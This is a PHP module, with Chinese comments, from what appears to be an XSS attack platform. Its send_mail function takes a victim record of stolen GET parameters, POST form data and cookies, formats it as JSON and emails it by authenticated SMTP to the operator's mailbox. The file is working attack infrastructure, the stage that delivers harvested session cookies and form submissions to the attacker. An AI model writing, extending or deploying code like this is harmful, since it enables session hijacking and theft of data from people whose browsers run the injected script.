<?php
if (!defined('IN_XSS_PLATFORM')) {
    exit('Access Denied');
}

require_once('PHPMailer/PHPMailerAutoload.php');
require_once('load.php');

function send_mail($xss_record_json) {
    $subject = 'GET:' . count($xss_record_json['get_data']) . '个 POST:' . count($xss_record_json['post_data']) . '个 Cookie:' . count($xss_record_json['cookie_data']) . '个';
    
    $body = json_encode($xss_record_json, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    $body = str_replace('\n', '<br/>', $body);
    $body = str_replace(' ', '&nbsp;', $body);
    
    $mail = new PHPMailer(); //实例化
    $mail->isSendmail();
    
    $mail->IsSMTP(); // 启用SMTP
    $mail->Host       = SMTP_SERVER; //SMTP服务器
    $mail->Port       = SMTP_PORT; //邮件发送端口
    $mail->SMTPAuth   = true; //启用SMTP认证
    $mail->SMTPSecure = SMTP_SECURE;
    $mail->CharSet    = 'UTF-8'; //字符集
    $mail->Encoding   = 'base64'; //编码方式
    
    $mail->Username = MAIL_USER; //你的邮箱
    $mail->Password = MAIL_PASS; //你的密码
    
    $mail->Subject  = $subject; //邮件标题
    $mail->From     = MAIL_FROM; //发件人地址（也就是你的邮箱）
    $mail->FromName = '通知'; //发件人姓名
    
    $mail->AddAddress(MAIL_RECV); //添加收件人（地址，昵称）
    
    $mail->IsHTML(true); //支持html格式内容
    
    $mail->Body = $body;
    $mail->Send();
}